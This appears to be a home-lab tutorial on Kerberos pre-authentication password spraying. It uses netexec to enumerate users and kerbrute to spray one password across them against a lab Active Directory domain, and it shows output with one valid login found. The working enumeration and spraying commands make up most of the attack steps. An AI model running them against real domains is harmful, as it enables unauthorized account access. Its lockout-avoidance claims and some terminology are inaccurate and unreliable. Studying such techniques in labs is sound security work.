# 🔐 **What is Kerberos Pre-Authentication?**
When a user wants to log into a service, Kerberos requires the client to encrypt a timestamp with the user's password (actually a derived key) and send it to the **Key Distribution Center (KDC)**.

- If the password is correct, the KDC can decrypt the timestamp and issue a **Ticket Granting Ticket (TGT)**.
- If the password is wrong, the KDC responds with an error.

---

###  **What is Pre-Auth Bruteforce?**
If **Kerberos pre-authentication is enabled** (which it usually is), attackers can't just request a ticket without knowing the password. But they **can**:

1. **Send an AS-REQ (Authentication Service Request)** to the KDC with an **invalid timestamp** (encrypted using a guessed password).
2. If the guess is correct, the KDC responds with a valid TGT.
3. If the guess is wrong, the KDC returns an error.

So, by automating this, attackers can **bruteforce usernames and passwords**.

---


###  Kerberos Pre-Authentication Password Spray (Kerbrute)

##  Goal
Identify valid user-password pairs in an Active Directory environment **without triggering account lockouts** by performing a **Kerberos Pre-Auth brute-force** using `kerbrute`.

---

###  Step 1: Enumerate Valid Usernames

Use `netexec` to pull valid usernames from SMB responses.

```bash
nxc smb 192.168.129.140 -u jack -p complex1@ --users | awk '/^SMB/ && $5 ~ /^[a-zA-Z0-9_.]+$/ { print $5 }' | tee -a username.txt
```

**Output (example):**
```
Administrator
Guest
krbtgt
jack
hwilliam
jcharles
mjames
Haseeb
Radeel
Abdullah
```

---

###  Step 2: Spray a Known Password Across All Users

Let's say we discovered the password `complex4@` somewhere, but don't know which user it belongs to.

We can use `kerbrute` to spray the password across all usernames.

```bash
./kerbrute passwordspray -d furious.local username.txt complex4@ --dc 192.168.129.140
```

**Example Output:**
```
──(kali㉿kali)-[~/Home-lab/Kerbrose/kerbrose-Pre-Auth]
└─$ ./kerbrute passwordspray -d furious.local username.txt complex4@ --dc 192.168.129.140



    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/24/25 - Ronnie Flathers @ropnop

2025/04/24 05:53:49 >  Using KDC(s):
2025/04/24 05:53:49 >   192.168.129.140:88

2025/04/24 05:53:49 >  [+] VALID LOGIN:  jcharles@furious.local:complex4@
2025/04/24 05:53:49 >  Done! Tested 20 logins (1 successes) in 0.186 seconds
                                                                                            
```

---

##  Why This Works

- `kerbrute` sends AS-REQs to the KDC (Kerberos Domain Controller).
- If pre-auth is enabled (default), the server will check the password by decrypting the timestamp in the AS-REQ using the hash of the user's password.
- If it's valid, you'll get a TGT response. If not, it's rejected.
- No lockout occurs **as long as accounts are configured not to lock on AS-REQ failures.**

---
